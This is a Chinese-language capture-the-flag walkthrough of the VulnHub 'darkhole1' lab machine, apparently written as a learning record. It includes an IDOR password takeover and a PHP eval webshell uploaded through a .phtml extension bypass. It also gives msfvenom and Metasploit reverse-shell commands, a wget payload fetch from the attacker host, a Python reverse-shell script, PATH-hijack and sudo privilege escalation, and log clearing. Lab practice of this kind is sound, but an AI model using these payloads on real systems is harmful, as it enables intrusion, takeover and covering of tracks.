# darkhole1

## 前言

靶机：`darkhole1`

攻击：`kali`



## 主机发现

使用`arp-scan -l`扫描，确保同一网卡

![](D:\stu\vulnhub\darkhole靶场\pic-1\1.jpg)







## 信息收集

#### 端口、服务发现

使用`nmap`进行扫描

![](D:\stu\vulnhub\darkhole靶场\pic-1\2.jpg)





访问80端口查看，访问后点击几处，发现一个登录界面，并且是`php`脚本

![](D:\stu\vulnhub\darkhole靶场\pic-1\3.jpg)





#### 指纹识别

使用`whatweb`暂未发现

![](D:\stu\vulnhub\darkhole靶场\pic-1\4.jpg)



使用工具`cmsvulscan`也未发现，工具地址`https://github.com/F6JO/CmsVulScan.git`

![](D:\stu\vulnhub\darkhole靶场\pic-1\5.jpg)



#### 进行目录扫描

使用`gobuster`进行扫描，发现一个`upload`目录

![](D:\stu\vulnhub\darkhole靶场\pic-1\6.jpg)



使用`dirsearch`扫描

![](D:\stu\vulnhub\darkhole靶场\pic-1\7.jpg)





#### 网站访问

访问`/config`，但是页面源码中没有任何信息，不过记住，这里因该是数据库连接文件

![](D:\stu\vulnhub\darkhole靶场\pic-1\8.jpg)

访问`dashboard.php`目录，不被允许访问，可能需要登录后才能访问

![](D:\stu\vulnhub\darkhole靶场\pic-1\9.jpg)



访问`upload`，应该是存放上传的图片目录

![](D:\stu\vulnhub\darkhole靶场\pic-1\10.jpg)

访问`register.php`，用于注册的界面

![](D:\stu\vulnhub\darkhole靶场\pic-1\11.jpg)



`login.php`前面看到，是用于登录的



`js`目录下有两个`js`文件

![](D:\stu\vulnhub\darkhole靶场\pic-1\12.jpg)

![12-1](D:\stu\vulnhub\darkhole靶场\pic-1\12-1.jpg)



登录和注册的页面下方都有一个制作者`made by red virus`，打开链接，发现是一名创作者，名字为`Ra2Ka`

![](D:\stu\vulnhub\darkhole靶场\pic-1\13.jpg)

尝试能否找到其产品的开源代码，并没有

![](D:\stu\vulnhub\darkhole靶场\pic-1\13-1.jpg)



## 漏洞寻找

#### 登录测试

尝试使用万能密码测试，能否登录，无法登录，但是这里可以进行爆破，测试大概十遍，发现并没有限制爆破的技术

![](D:\stu\vulnhub\darkhole靶场\pic-1\14.jpg)



#### 注册界面

尝试注册`admin`，发现提示已经存在，说明有该用户

![](D:\stu\vulnhub\darkhole靶场\pic-1\15.jpg)



注册一个普通用户，先登录进去再看，注册后只发现有两个，一个是更新信息，一个是更改密码

![](D:\stu\vulnhub\darkhole靶场\pic-1\15-1.jpg)



#### 抓包分析

这时候就需要使用`burp`抓包分析了，先测试改密码，发现这里只需要点击`change`后，直接就会修改密码，然后退出登录

流程大概这样，抓取改密码时的那个单独数据包进行分析测试

![](D:\stu\vulnhub\darkhole靶场\pic-1\16.jpg)



可以看到，密码已知，这里直接就是想要修改成什么的密码，后面的`id`参数，可能代表身份，可以对这个进行测试

当修改路径中的`id`时，提示不允许访问其他用户的信息

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-1.jpg)



那么再创建一个用户进行观察其`id`的值，可以，说明是按照`id`值进行的身份

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-2.jpg)



那么这里在之前的数据包中，把`id`改为3进行观察，可以确定，这是支持水平越权的

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-3.jpg)



修改`post`请求头中的`id`，看能否修改`dijia`的密码

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-4.jpg)



到登录界面以`dijia`的修改过后的进行登录，登录成功

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-5.jpg)



那么这里就把数据包`post`请求体中的`id`改为1，然后登录测试

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-6.jpg)



之前前面在进行注册的时候，以`admin`注册时，提示已经有了，那么以`admin`并以改过数据包的密码进行登录测试

登录成功，发现不一样的点在于，多了上传功能

![](D:\stu\vulnhub\darkhole靶场\pic-1\16-7.jpg)





#### 文件上传测试

尝试上传一句话木马

```php
<?php @eval($_REQUEST['cmd']);?>
```

有检测，提示只能上传图片类型

![](D:\stu\vulnhub\darkhole靶场\pic-1\17.jpg)



尝试把`php`格式改为图片格式，再进行上传，这里要配合抓包

在`burp`抓取的数据包中修改原本的图片格式，改为`php`

![](D:\stu\vulnhub\darkhole靶场\pic-1\17-1.jpg)



还是提示只能上传图片格式



那么这里就使劲进行测试，先把扩展格式，大小写等先测试一遍，测试了一遍，发现，`phtml`可以上传成功，并且使用蚁🗡可以连接

![](D:\stu\vulnhub\darkhole靶场\pic-1\17-2.jpg)



![](D:\stu\vulnhub\darkhole靶场\pic-1\17-3.jpg)



之前那个数据库文件`/config/database.php`去看看

![](D:\stu\vulnhub\darkhole靶场\pic-1\17-4.jpg)



#### 反弹shell

获取到数据库的账户和密码，不知道能否可用于登录，测试发现无用，生成一个`php`反弹。为什么要生成呢，也是为了能够熟练其他操作，当然在蚁🗡上也是可以直接使用终端的。

这里只是生成一个简单的反弹`shell`，还可以用`msf`生成一个shell，然后使用`msf`中的`exploit/multi/handler`模块监听即可获取一个终端

```shell
kali上运行
msfvenom -p php/reverse_php LHOST=192.168.1.16 LPORT=9999 > te.php
python3 -m http.server 8888
nc -lvvp 9999

靶机下载后，通过浏览器访问该php文件，这里放入/upload下
wget http://192.168.1.16:8888/te.php
```



这里还是以蚁🗡的虚拟终端操作，寻找具有SUID权限的命令

![](D:\stu\vulnhub\darkhole靶场\pic-1\18.jpg)



## 提权

#### 环境变量export提权

有一个`toto`命令，去目录下查看

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-1.jpg)

查看文件，发现乱码，可能是可执行文件

ELF代表Executable and Linkable Forma，是一种对可执行文件、目标文件和库使用的文件格式，跟Windows下的PE文件格式类似

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-2.jpg)

可以看到，就是执行`id`命令，并且这里的`id`结果，是`john`的，那么这个命令是否调用的是`/bin`下的`id`命令呢

这里想想一下环境变量，一般都是从环境变量中调用，那么`export`可以设置临时环境，并具有优先权的

`export`命令可用

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-4.jpg)



创建一个文件为`id`，名字要一致，然后输入命令调用`/bin/bash`

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-3.jpg)



当前环境变量未变化，可能是目录的权限问题，切换到`/tmp`或者`/var`下测试

还是不行，这里不理解怎么回事，还是使用`msf`反弹shell进行测试

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-5.jpg)



![](D:\stu\vulnhub\darkhole靶场\pic-1\18-6.jpg)



这里因为测试`mv`命令可用，所以在该目录下载，一般还是在之前的`/upload`下载

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-7.jpg)



`msf`配置参数并开启监听

```shell
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.16
set lport 9999
run
```

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-8.jpg)



使用浏览器访问`/upload`下的`te.php`

`msf`获取`shell`，然后到`/tmp`目录下，继续之前的使用临时变量

![](D:\stu\vulnhub\darkhole靶场\pic-1\18-9.jpg)



这里发现已经可以了，就挺奇怪的，也不知道为什么蚁🗡不行



执行`/home/john/toto`提权到`john`用户

![](D:\stu\vulnhub\darkhole靶场\pic-1\19.jpg)



获取到一个密码`root123`

![](D:\stu\vulnhub\darkhole靶场\pic-1\20.jpg)



使用`ssh`命令测试是否是`john`的密码，没错，就是他的密码，当然这个密码也可以使用`hydra`进行其他用户的测试

![](D:\stu\vulnhub\darkhole靶场\pic-1\21.jpg)

搜索具有SUID权限的，有`su、sudo、at`可能可以利用的

使用`sudo -l`寻找，发现一个以`root`可用的文件，就在当前目录，去查看

![](D:\stu\vulnhub\darkhole靶场\pic-1\22.jpg)



![](D:\stu\vulnhub\darkhole靶场\pic-1\23.jpg)



是个空文件，那么就可以往里面写代码，来获取`root`的`bash`，这里提示，不让用户`john`作为root执行

![](D:\stu\vulnhub\darkhole靶场\pic-1\24.jpg)



#### sudo提权

ok，这里还有另一个用户，尝试使用之前获得的密码进行测试`root123`，发现可以

使用`darkhole`测试，发现使用`sudo`可以运行一切



![](D:\stu\vulnhub\darkhole靶场\pic-1\25.jpg)



使用`sudo`执行之前的`python`脚本

![](D:\stu\vulnhub\darkhole靶场\pic-1\26.jpg)



或者直接`sudo -i、sudo -s`或`sudo su -`，反正和`sudo`有关的提权基本上都可以上

![](D:\stu\vulnhub\darkhole靶场\pic-1\27.jpg)



#### python提权

在网上看到使用`john`也可以提权的方式，编写`file.py`脚本

```python
import os,pty,socket
s=socket.socket()
s.connect(("192.168.1.16",9999))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("bash")
```

![](D:\stu\vulnhub\darkhole靶场\pic-1\28.jpg)



## 清空日志和历史记录

![](D:\stu\vulnhub\darkhole靶场\pic-1\29.jpg)







## 总结

1. 网站可能错在的业务漏洞，这里是权限的问题
2. 文件上传的漏洞，扩展名即可
3. `msf`生成`php`反弹`shell`与进行监听的使用
4. 一个密码多用账户的情况
5. `export`临时环境变量的使用
6. `sudo`提权的掌握
7. `python`反弹进行提权























